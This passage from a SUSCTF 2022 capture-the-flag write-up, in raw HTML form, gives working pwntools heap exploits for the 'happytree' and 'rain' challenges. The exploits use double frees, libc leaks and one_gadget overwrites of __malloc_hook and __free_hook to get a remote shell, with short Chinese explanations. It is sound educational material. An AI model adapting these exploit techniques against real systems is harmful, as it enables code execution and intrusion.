class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;DEBUG&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;,&#x27;./rain&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;, &quot;TERM&quot;:&quot;xterm&quot;&#125;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;124.71.185.75&#x27;</span>,<span class=\"number\">9999</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">e = ELF(<span class=\"string\">&#x27;./rain&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">frame</span>(<span class=\"params\">sh, sw, font, color, rainfall, table1</span>):</span><br><span class=\"line\">    p = p32(sh)</span><br><span class=\"line\">    p += p32(sw)</span><br><span class=\"line\">    p += p8(font)</span><br><span class=\"line\">    p += p8(color)</span><br><span class=\"line\">    p += p32(rainfall)</span><br><span class=\"line\">    p += p32(<span class=\"number\">0xdeadbeaf</span>)</span><br><span class=\"line\">    p += table1</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">config</span>(<span class=\"params\">fra</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;ch&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;FRAME&gt; &#x27;</span>, fra)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;ch&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rain</span>():</span><br><span class=\"line\">    context.log_level=<span class=\"string\">&#x27;INFO&#x27;</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;ch&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_got = e.got[<span class=\"string\">&#x27;malloc&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(malloc_got))</span><br><span class=\"line\"></span><br><span class=\"line\">p1 = p64(<span class=\"number\">0x00000603000</span>)</span><br><span class=\"line\">p1 += <span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x20</span> - <span class=\"built_in\">len</span>(p1))</span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, p1)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">rain()</span><br><span class=\"line\"><span class=\"comment\"># show()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">show()   </span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class=\"line\">inp = io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">inp = u64(inp)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;_IO_2_1_stdout_:&quot;</span>+<span class=\"built_in\">hex</span>(inp))</span><br><span class=\"line\">libc_base = inp - libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;libc_base:&quot;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0x4f365</span>,<span class=\"number\">0x4f3c2</span>,<span class=\"number\">0x10a45c</span>]</span><br><span class=\"line\">malloc_hook = libc_base + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;malloc_hook:&quot;</span>+<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">rain()</span><br><span class=\"line\">p = frame(<span class=\"number\">0x40</span>,<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x40</span>,<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x40</span>,<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\"></span><br><span class=\"line\">p1 = p64(malloc_hook)</span><br><span class=\"line\">p1 += <span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x70</span> - <span class=\"built_in\">len</span>(p1))</span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, p1)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">rain()</span><br><span class=\"line\"></span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">rain()</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(<span class=\"string\">&quot;ogg:&quot;</span>+<span class=\"built_in\">hex</span>(ogg[<span class=\"number\">0</span>]+libc_base))</span><br><span class=\"line\">p1 = p64(ogg[<span class=\"number\">1</span>]+libc_base) * (<span class=\"number\">0x70</span> // <span class=\"number\">8</span>)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x1</span>,<span class=\"number\">0x1</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, p1)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x1</span>,<span class=\"number\">0x1</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n","excerpt":"","more":"<h1 id=\"Happytree\"><a href=\"#Happytree\" class=\"headerlink\" title=\"Happytree\"></a>Happytree</h1><h2 id=\"题目附件\"><a href=\"#题目附件\" class=\"headerlink\" title=\"题目附件\"></a>题目附件</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/happytree.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/happytree.zip</a></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>漏洞点在C++的new和delete不对堆空间进行初始化，并且delete逻辑中存在指针未清零的情况，而且存在有符号整数和无符号整数混淆，构造payload泄露main_arena和堆地址后，利用libc-2.27构造tcache的doublefree，最后new出__malloc_hook地址，写入ogg获得shell</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> ctypes</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;,&#x27;./happytree&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;124.71.147.225&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./happytree&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">idx = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">data,content</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> root</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;content: &quot;</span>,content)</span><br><span class=\"line\">    idx.append(data)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add1</span>(<span class=\"params\">data,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;content: &quot;</span>,content)</span><br><span class=\"line\">    idx.append(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add2</span>(<span class=\"params\">data,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> data <span class=\"keyword\">in</span> idx:</span><br><span class=\"line\">        <span class=\"keyword\">del</span> idx[idx.index(data)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;cmd&gt; &#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;data: &quot;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">to_size</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (ctypes.c_int(<span class=\"number\">0xffffff00</span> | size)).value</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ctypes.c_int(x).value</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | 0x200, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | 0x100, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | 0x300, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># free(0x80 | 0x200)</span></span><br><span class=\"line\"><span class=\"comment\"># for i in range(8):</span></span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | (<span class=\"number\">0xfff00000</span>)), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">1</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">2</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">3</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">4</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">5</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">6</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">7</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span> | (<span class=\"number\">8</span>*<span class=\"number\">0x100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | (9*0x100), &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(0x80 | (10*0x100), &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | (<span class=\"number\">0xff000000</span>)), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># free(0x80 | (10*0x100))</span></span><br><span class=\"line\"><span class=\"comment\"># free(0x80 | (8*0x100))</span></span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">8</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">7</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">6</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">5</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">4</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">3</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">2</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\">free(<span class=\"number\">0x80</span> | (<span class=\"number\">1</span>*<span class=\"number\">0x100</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0100</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0200</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0300</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0400</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0500</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0600</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0700</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># show(0x80 | 0x700)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add1(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0800</span>), <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">show(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0800</span>))</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;content: aaaaaaaa&#x27;</span>)</span><br><span class=\"line\">inp = io.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">inp = u64(inp)</span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(inp))</span><br><span class=\"line\">main_arena = inp - <span class=\"number\">96</span></span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(main_arena))</span><br><span class=\"line\">libc_base = main_arena - <span class=\"number\">0x00003EBC40</span></span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">free(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0700</span>))</span><br><span class=\"line\">free(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0800</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x20</span> | <span class=\"number\">0x100</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">23</span>)</span><br><span class=\"line\">show(<span class=\"number\">0x20</span> | <span class=\"number\">0x100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">hp = io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">hp = u64(hp)</span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(hp))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0x20</span> | <span class=\"number\">0x100</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xf0000000</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xffff0700</span>), <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free(inv(<span class=\"number\">0x80</span> | <span class=\"number\">0xf0000000</span>))</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0x4f365</span>,<span class=\"number\">0x4f3c2</span>,<span class=\"number\">0x10a45c</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = libc_base + libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">p = p64(malloc_hook)</span><br><span class=\"line\">add1(<span class=\"number\">0x80</span> | ((hp - (hp &amp; <span class=\"number\">0xff</span>)) &amp; <span class=\"number\">0xffffffff</span>), p)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(<span class=\"number\">0x80</span> | ((hp - (hp &amp; <span class=\"number\">0xff</span>)) &amp; <span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">time.sleep(<span class=\"number\">4</span>)</span><br><span class=\"line\">add1(<span class=\"number\">0x80</span> | <span class=\"number\">0x100</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">p = p64(ogg[<span class=\"number\">2</span>] + libc_base)</span><br><span class=\"line\">add1(<span class=\"number\">0x80</span> | <span class=\"number\">0x5000</span>, p)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">add2(<span class=\"number\">0x80</span> | <span class=\"number\">0x6000</span>, p)</span><br><span class=\"line\"><span class=\"comment\"># free(inv(0x80 | 0xffff0400))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print idx</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(to_size(0x80 | 0x100))</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\"># print hex(to_size(10))</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"rain\"><a href=\"#rain\" class=\"headerlink\" title=\"rain\"></a>rain</h1><h2 id=\"题目附件-1\"><a href=\"#题目附件-1\" class=\"headerlink\" title=\"题目附件\"></a>题目附件</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/rain.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-02_SUSCTF/rain.zip</a></p>\n<h2 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>当realloc(ptr, 0)时，函数返回null，v7&#x3D;&#x3D;0过不了if判断，故不会将指针清零，可以构造doublefree，利用doublefree和printf%s泄露在bss段上的_IO_2_1_stdout_地址，即可知道libc基址，最后向__free_hook写入ogg即可getshell</p>\n<p><img src=\"/p/SUSCTF-wp/image-20220301155642358.png\" alt=\"image-20220301155642358\"></p>\n<h2 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span 